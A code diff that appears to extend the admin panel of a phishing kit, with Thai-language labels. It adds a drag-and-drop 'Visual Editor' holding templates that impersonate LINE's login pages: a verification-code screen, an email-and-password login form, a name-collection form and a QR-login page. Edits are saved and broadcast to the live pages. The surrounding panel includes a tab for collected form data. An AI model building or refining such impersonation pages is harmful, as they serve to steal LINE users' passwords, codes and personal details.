@@ -407,6 +407,7 @@
                 <button class="nav-item" onclick="showTab('theme')">ธีมและสี</button>
                 <button class="nav-item" onclick="showTab('data')">ข้อมูลฟอร์ม</button>
                 <button class="nav-item" onclick="showTab('pages')">จัดการหน้า</button>
+                <button class="nav-item" onclick="showTab('visual-editor')">🎨 Visual Editor</button>
             </div>
 
             <div class="content">
@@ -594,6 +595,69 @@
                         <div style="margin-top: 30px;">
                             <button class="btn btn-primary" onclick="savePages()">บันทึกการตั้งค่า</button>
                             <button class="btn btn-secondary" onclick="openWebsite()">ดูตัวอย่าง</button>
+                        </div>
+                    </div>
+
+                    <!-- Visual Editor -->
+                    <div id="visual-editor" class="tab-panel">
+                        <h2 style="margin-bottom: 20px;">🎨 Visual Page Builder</h2>
+                        <p style="color: #6b7280; margin-bottom: 20px;">แก้ไขหน้าเว็บแบบ Drag & Drop - เปลี่ยนแปลงทุกส่วนได้</p>
+                        
+                        <!-- Page Selector -->
+                        <div style="margin-bottom: 20px;">
+                            <label class="form-label">เลือกหน้าที่ต้องการแก้ไข:</label>
+                            <select id="page-selector" class="form-input" onchange="loadPageForEdit()" style="width: 300px;">
+                                <option value="verification">หน้ารหัสยืนยันตัวตน</option>
+                                <option value="email">หน้าล็อกอินด้วยอีเมล</option>
+                                <option value="form">หน้าฟอร์มข้อมูล</option>
+                                <option value="qr">หน้า QR Code</option>
+                            </select>
+                        </div>
+
+                        <!-- Visual Editor Container -->
+                        <div style="display: flex; gap: 20px; height: 600px;">
+                            <!-- Left Panel - Tools -->
+                            <div style="width: 250px; background: #f8fafc; border-radius: 10px; padding: 20px;">
+                                <h3 style="margin-bottom: 15px;">🛠️ เครื่องมือ</h3>
+                                
+                                <!-- Element Tools -->
+                                <div style="margin-bottom: 20px;">
+                                    <h4 style="margin-bottom: 10px; color: #374151;">องค์ประกอบ</h4>
+                                    <button class="tool-btn" onclick="addElement('text')" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #22c55e; color: white; border-radius: 5px; cursor: pointer;">📝 ข้อความ</button>
+                                    <button class="tool-btn" onclick="addElement('number')" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #3b82f6; color: white; border-radius: 5px; cursor: pointer;">🔢 ตัวเลข</button>
+                                    <button class="tool-btn" onclick="addElement('image')" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #f59e0b; color: white; border-radius: 5px; cursor: pointer;">🖼️ รูปภาพ</button>
+                                    <button class="tool-btn" onclick="addElement('button')" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #8b5cf6; color: white; border-radius: 5px; cursor: pointer;">🔘 ปุ่ม</button>
+                                    <button class="tool-btn" onclick="addElement('input')" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #06b6d4; color: white; border-radius: 5px; cursor: pointer;">📋 ช่องกรอก</button>
+                                </div>
+
+                                <!-- Properties Panel -->
+                                <div id="properties-panel" style="display: none;">
+                                    <h4 style="margin-bottom: 10px; color: #374151;">คุณสมบัติ</h4>
+                                    <div id="properties-content"></div>
+                                </div>
+                            </div>
+
+                            <!-- Center Panel - Canvas -->
+                            <div style="flex: 1; background: white; border: 2px dashed #e5e7eb; border-radius: 10px; position: relative; overflow: auto;">
+                                <div id="visual-canvas" style="width: 400px; height: 600px; margin: 20px auto; background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); position: relative; padding: 40px;">
+                                    <!-- Canvas content will be loaded here -->
+                                </div>
+                            </div>
+
+                            <!-- Right Panel - Layers -->
+                            <div style="width: 200px; background: #f8fafc; border-radius: 10px; padding: 20px;">
+                                <h3 style="margin-bottom: 15px;">📋 เลเยอร์</h3>
+                                <div id="layers-panel">
+                                    <!-- Layers will be listed here -->
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Action Buttons -->
+                        <div style="margin-top: 20px; text-align: center;">
+                            <button class="btn btn-primary" onclick="saveVisualChanges()">💾 บันทึกการเปลี่ยนแปลง</button>
+                            <button class="btn btn-secondary" onclick="previewPage()">👁️ ดูตัวอย่าง</button>
+                            <button class="btn btn-secondary" onclick="resetPage()">🔄 รีเซ็ต</button>
                         </div>
                     </div>
                 </div>
@@ -936,6 +1000,464 @@
             if (e.key === 'Enter' && document.getElementById('login-page').style.display !== 'none') {
                 login();
             }
+        });
+
+        // ===== VISUAL EDITOR FUNCTIONS =====
+        
+        let selectedElement = null;
+        let draggedElement = null;
+        let currentPage = 'verification';
+        let visualElements = {};
+
+        // โหลดหน้าสำหรับแก้ไข
+        function loadPageForEdit() {
+            currentPage = document.getElementById('page-selector').value;
+            loadCanvasContent();
+            updateLayersPanel();
+        }
+
+        // โหลดเนื้อหาลงใน canvas
+        function loadCanvasContent() {
+            const canvas = document.getElementById('visual-canvas');
+            
+            // Template สำหรับแต่ละหน้า
+            const templates = {
+                verification: `
+                    <div class="editable-element" data-type="text" data-id="logo" style="text-align: center; margin-bottom: 20px;">
+                        <h1 style="color: #22c55e; font-size: 36px; font-weight: bold;">LINE</h1>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="title" style="text-align: center; margin-bottom: 10px;">
+                        <h2 style="color: #1f2937; font-size: 24px;">รหัสยืนยันตัวตน</h2>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="subtitle" style="text-align: center; margin-bottom: 30px; color: #6b7280;">
+                        <p>กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย</p>
+                    </div>
+                    <div class="editable-element" data-type="number" data-id="code" style="text-align: center; margin-bottom: 10px;">
+                        <div style="border: 2px solid #e5e7eb; border-radius: 12px; padding: 20px; display: inline-block;">
+                            <span style="font-size: 48px; font-weight: bold; color: #1f2937;">4906</span>
+                        </div>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="timer" style="text-align: center; margin-bottom: 20px;">
+                        <p style="color: #ef4444;">เหลือเวลา: 02:55</p>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="info" style="text-align: center; margin-bottom: 10px; color: #6b7280;">
+                        <p>ไม่ต้องใส่รหัสยืนยันตัวตนของ LINE<br>สำหรับอีเมลนี้ในไฟล์นี้</p>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="link" style="text-align: center;">
+                        <a href="#" style="color: #3b82f6; text-decoration: none;">เข้าสู่ระบบด้วยคิวอาร์โค้ด</a>
+                    </div>
+                `,
+                email: `
+                    <div class="editable-element" data-type="text" data-id="logo" style="text-align: center; margin-bottom: 30px;">
+                        <h1 style="color: #22c55e; font-size: 36px; font-weight: bold;">LINE</h1>
+                    </div>
+                    <div class="editable-element" data-type="input" data-id="email" style="margin-bottom: 20px;">
+                        <input type="email" placeholder="bn9.club@gmail.com" style="width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px;">
+                    </div>
+                    <div class="editable-element" data-type="input" data-id="password" style="margin-bottom: 20px;">
+                        <input type="password" placeholder="••••••••" style="width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px;">
+                    </div>
+                    <div class="editable-element" data-type="button" data-id="login-btn" style="margin-bottom: 20px;">
+                        <button style="width: 100%; padding: 15px; background: #22c55e; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold;">เข้าสู่ระบบ</button>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="divider" style="text-align: center; margin: 20px 0; color: #6b7280;">
+                        <p>เข้าสู่ระบบด้วยคิวอาร์โค้ด</p>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="forgot" style="text-align: center;">
+                        <a href="#" style="color: #3b82f6; text-decoration: none;">ลืมรหัสผ่านหรือไม่?</a>
+                    </div>
+                `,
+                form: `
+                    <div class="editable-element" data-type="text" data-id="logo" style="text-align: center; margin-bottom: 30px;">
+                        <h1 style="color: #22c55e; font-size: 36px; font-weight: bold;">LINE</h1>
+                    </div>
+                    <div class="editable-element" data-type="input" data-id="firstname" style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 5px; color: #374151;">ชื่อ</label>
+                        <input type="text" style="width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px;">
+                    </div>
+                    <div class="editable-element" data-type="input" data-id="lastname" style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 5px; color: #374151;">นามสกุล</label>
+                        <input type="text" style="width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px;">
+                    </div>
+                    <div class="editable-element" data-type="button" data-id="submit-btn" style="margin-bottom: 20px;">
+                        <button style="width: 100%; padding: 15px; background: #22c55e; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold;">ส่งข้อมูล</button>
+                    </div>
+                `,
+                qr: `
+                    <div class="editable-element" data-type="text" data-id="logo" style="text-align: center; margin-bottom: 30px;">
+                        <h1 style="color: #22c55e; font-size: 36px; font-weight: bold;">LINE</h1>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="title" style="text-align: center; margin-bottom: 20px;">
+                        <h2 style="color: #1f2937; font-size: 24px;">เข้าสู่ระบบด้วยคิวอาร์โค้ด</h2>
+                    </div>
+                    <div class="editable-element" data-type="image" data-id="qr-code" style="text-align: center; margin-bottom: 20px;">
+                        <div style="width: 150px; height: 150px; background: #000; margin: 0 auto; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white;">QR Code</div>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="info" style="text-align: center; margin-bottom: 20px; color: #6b7280;">
+                        <p>สร้างคิวอาร์โค้ดใหม่</p>
+                        <p>โปรดเปิดคิวอาร์โค้ดในแอป LINE สำหรับเข้าสู่ระบบใหม่แล้ว<br>สแกนคิวอาร์โค้ด</p>
+                    </div>
+                    <div class="editable-element" data-type="text" data-id="link" style="text-align: center;">
+                        <a href="#" style="color: #3b82f6; text-decoration: none;">เข้าสู่ระบบด้วยอีเมล</a>
+                    </div>
+                `
+            };
+
+            canvas.innerHTML = templates[currentPage] || templates.verification;
+            
+            // เพิ่ม event listeners สำหรับ elements
+            addElementEventListeners();
+        }
+
+        // เพิ่ม event listeners สำหรับ elements
+        function addElementEventListeners() {
+            const elements = document.querySelectorAll('.editable-element');
+            
+            elements.forEach(element => {
+                // Click to select
+                element.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    selectElement(this);
+                });
+
+                // Double click to edit
+                element.addEventListener('dblclick', function(e) {
+                    e.stopPropagation();
+                    editElement(this);
+                });
+
+                // Make draggable
+                element.draggable = true;
+                element.addEventListener('dragstart', function(e) {
+                    draggedElement = this;
+                    e.dataTransfer.effectAllowed = 'move';
+                });
+
+                // Add resize handles
+                addResizeHandles(element);
+            });
+
+            // Canvas drop zone
+            const canvas = document.getElementById('visual-canvas');
+            canvas.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                e.dataTransfer.dropEffect = 'move';
+            });
+
+            canvas.addEventListener('drop', function(e) {
+                e.preventDefault();
+                if (draggedElement) {
+                    const rect = canvas.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    
+                    draggedElement.style.position = 'absolute';
+                    draggedElement.style.left = x + 'px';
+                    draggedElement.style.top = y + 'px';
+                    
+                    draggedElement = null;
+                }
+            });
+        }
+
+        // เลือก element
+        function selectElement(element) {
+            // Remove previous selection
+            document.querySelectorAll('.editable-element').forEach(el => {
+                el.classList.remove('selected');
+            });
+
+            // Add selection
+            element.classList.add('selected');
+            selectedElement = element;
+
+            // Show properties panel
+            showPropertiesPanel(element);
+            updateLayersPanel();
+        }
+
+        // แสดง properties panel
+        function showPropertiesPanel(element) {
+            const panel = document.getElementById('properties-panel');
+            const content = document.getElementById('properties-content');
+            
+            const type = element.dataset.type;
+            const id = element.dataset.id;
+            
+            let propertiesHTML = `
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ตำแหน่ง X:</label>
+                    <input type="number" id="pos-x" value="${element.offsetLeft}" onchange="updateElementPosition()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ตำแหน่ง Y:</label>
+                    <input type="number" id="pos-y" value="${element.offsetTop}" onchange="updateElementPosition()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ความกว้าง:</label>
+                    <input type="number" id="width" value="${element.offsetWidth}" onchange="updateElementSize()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ความสูง:</label>
+                    <input type="number" id="height" value="${element.offsetHeight}" onchange="updateElementSize()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                </div>
+            `;
+
+            if (type === 'text') {
+                const textContent = element.textContent || element.innerHTML;
+                propertiesHTML += `
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ข้อความ:</label>
+                        <textarea id="text-content" onchange="updateTextContent()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px; min-height: 60px;">${textContent}</textarea>
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">สี:</label>
+                        <input type="color" id="text-color" onchange="updateTextColor()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ขนาดตัวอักษร:</label>
+                        <input type="number" id="font-size" onchange="updateFontSize()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                    </div>
+                `;
+            }
+
+            if (type === 'number') {
+                const numberContent = element.textContent;
+                propertiesHTML += `
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">ตัวเลข:</label>
+                        <input type="text" id="number-content" value="${numberContent}" onchange="updateNumberContent()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                    </div>
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">สี:</label>
+                        <input type="color" id="number-color" onchange="updateNumberColor()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                    </div>
+                `;
+            }
+
+            if (type === 'image') {
+                propertiesHTML += `
+                    <div style="margin-bottom: 15px;">
+                        <label style="display: block; margin-bottom: 5px; font-size: 12px; color: #6b7280;">อัปโหลดรูป:</label>
+                        <input type="file" id="image-upload" accept="image/*" onchange="updateImage()" style="width: 100%; padding: 5px; border: 1px solid #e5e7eb; border-radius: 4px;">
+                    </div>
+                `;
+            }
+
+            propertiesHTML += `
+                <div style="margin-top: 20px;">
+                    <button onclick="duplicateElement()" style="width: 100%; margin-bottom: 5px; padding: 8px; border: none; background: #3b82f6; color: white; border-radius: 4px; cursor: pointer;">📋 คัดลอก</button>
+                    <button onclick="deleteElement()" style="width: 100%; padding: 8px; border: none; background: #ef4444; color: white; border-radius: 4px; cursor: pointer;">🗑️ ลบ</button>
+                </div>
+            `;
+
+            content.innerHTML = propertiesHTML;
+            panel.style.display = 'block';
+        }
+
+        // อัปเดต layers panel
+        function updateLayersPanel() {
+            const panel = document.getElementById('layers-panel');
+            const elements = document.querySelectorAll('.editable-element');
+            
+            let layersHTML = '';
+            elements.forEach((element, index) => {
+                const type = element.dataset.type;
+                const id = element.dataset.id;
+                const isSelected = element === selectedElement;
+                
+                layersHTML += `
+                    <div onclick="selectElementById('${id}')" style="padding: 8px; margin-bottom: 5px; background: ${isSelected ? '#22c55e' : '#white'}; color: ${isSelected ? 'white' : '#374151'}; border-radius: 4px; cursor: pointer; border: 1px solid #e5e7eb;">
+                        ${type === 'text' ? '📝' : type === 'number' ? '🔢' : type === 'image' ? '🖼️' : type === 'button' ? '🔘' : '📋'} ${id}
+                    </div>
+                `;
+            });
+            
+            panel.innerHTML = layersHTML;
+        }
+
+        // เพิ่ม resize handles
+        function addResizeHandles(element) {
+            // Add CSS for selected elements
+            const style = document.createElement('style');
+            style.textContent = `
+                .editable-element.selected {
+                    outline: 2px solid #22c55e !important;
+                    position: relative;
+                }
+                .editable-element.selected::after {
+                    content: '';
+                    position: absolute;
+                    right: -5px;
+                    bottom: -5px;
+                    width: 10px;
+                    height: 10px;
+                    background: #22c55e;
+                    cursor: se-resize;
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // Functions สำหรับอัปเดต properties
+        function updateElementPosition() {
+            if (!selectedElement) return;
+            const x = document.getElementById('pos-x').value;
+            const y = document.getElementById('pos-y').value;
+            selectedElement.style.position = 'absolute';
+            selectedElement.style.left = x + 'px';
+            selectedElement.style.top = y + 'px';
+        }
+
+        function updateElementSize() {
+            if (!selectedElement) return;
+            const width = document.getElementById('width').value;
+            const height = document.getElementById('height').value;
+            selectedElement.style.width = width + 'px';
+            selectedElement.style.height = height + 'px';
+        }
+
+        function updateTextContent() {
+            if (!selectedElement) return;
+            const content = document.getElementById('text-content').value;
+            selectedElement.innerHTML = content;
+        }
+
+        function updateTextColor() {
+            if (!selectedElement) return;
+            const color = document.getElementById('text-color').value;
+            selectedElement.style.color = color;
+        }
+
+        function updateFontSize() {
+            if (!selectedElement) return;
+            const size = document.getElementById('font-size').value;
+            selectedElement.style.fontSize = size + 'px';
+        }
+
+        function updateNumberContent() {
+            if (!selectedElement) return;
+            const content = document.getElementById('number-content').value;
+            selectedElement.textContent = content;
+        }
+
+        function updateNumberColor() {
+            if (!selectedElement) return;
+            const color = document.getElementById('number-color').value;
+            selectedElement.style.color = color;
+        }
+
+        function updateImage() {
+            if (!selectedElement) return;
+            const file = document.getElementById('image-upload').files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    selectedElement.innerHTML = `<img src="${e.target.result}" style="max-width: 100%; height: auto;">`;
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function selectElementById(id) {
+            const element = document.querySelector(`[data-id="${id}"]`);
+            if (element) {
+                selectElement(element);
+            }
+        }
+
+        function duplicateElement() {
+            if (!selectedElement) return;
+            const clone = selectedElement.cloneNode(true);
+            clone.dataset.id = clone.dataset.id + '_copy';
+            clone.style.left = (selectedElement.offsetLeft + 20) + 'px';
+            clone.style.top = (selectedElement.offsetTop + 20) + 'px';
+            document.getElementById('visual-canvas').appendChild(clone);
+            addElementEventListeners();
+            updateLayersPanel();
+        }
+
+        function deleteElement() {
+            if (!selectedElement) return;
+            selectedElement.remove();
+            selectedElement = null;
+            document.getElementById('properties-panel').style.display = 'none';
+            updateLayersPanel();
+        }
+
+        function addElement(type) {
+            const canvas = document.getElementById('visual-canvas');
+            const id = type + '_' + Date.now();
+            
+            let elementHTML = '';
+            switch(type) {
+                case 'text':
+                    elementHTML = '<p>ข้อความใหม่</p>';
+                    break;
+                case 'number':
+                    elementHTML = '<span style="font-size: 24px; font-weight: bold;">1234</span>';
+                    break;
+                case 'image':
+                    elementHTML = '<div style="width: 100px; height: 100px; background: #e5e7eb; border-radius: 8px; display: flex; align-items: center; justify-content: center;">รูปภาพ</div>';
+                    break;
+                case 'button':
+                    elementHTML = '<button style="padding: 10px 20px; background: #22c55e; color: white; border: none; border-radius: 8px;">ปุ่มใหม่</button>';
+                    break;
+                case 'input':
+                    elementHTML = '<input type="text" placeholder="ช่องกรอกใหม่" style="padding: 10px; border: 2px solid #e5e7eb; border-radius: 8px; width: 200px;">';
+                    break;
+            }
+            
+            const element = document.createElement('div');
+            element.className = 'editable-element';
+            element.dataset.type = type;
+            element.dataset.id = id;
+            element.style.position = 'absolute';
+            element.style.left = '50px';
+            element.style.top = '50px';
+            element.innerHTML = elementHTML;
+            
+            canvas.appendChild(element);
+            addElementEventListeners();
+            selectElement(element);
+            updateLayersPanel();
+        }
+
+        function saveVisualChanges() {
+            // บันทึกการเปลี่ยนแปลงลง localStorage
+            const canvas = document.getElementById('visual-canvas');
+            const pageData = {
+                html: canvas.innerHTML,
+                timestamp: Date.now()
+            };
+            
+            localStorage.setItem(`visualPage_${currentPage}`, JSON.stringify(pageData));
+            broadcastConfigUpdate();
+            
+            showNotification('บันทึกการเปลี่ยนแปลงเรียบร้อย!');
+        }
+
+        function previewPage() {
+            window.open(`./index.html#${currentPage}`, '_blank');
+        }
+
+        function resetPage() {
+            if (confirm('คุณแน่ใจหรือไม่ที่จะรีเซ็ตหน้านี้?')) {
+                localStorage.removeItem(`visualPage_${currentPage}`);
+                loadCanvasContent();
+                updateLayersPanel();
+                showNotification('รีเซ็ตหน้าเรียบร้อย!');
+            }
+        }
+
+        // เริ่มต้น Visual Editor เมื่อโหลดหน้า
+        document.addEventListener('DOMContentLoaded', function() {
+            // โหลด Visual Editor เมื่อเปิดแท็บ
+            setTimeout(() => {
+                if (document.getElementById('visual-editor')) {
+                    loadPageForEdit();
+                }
+            }, 1000);
         });
     </script>
 </body>
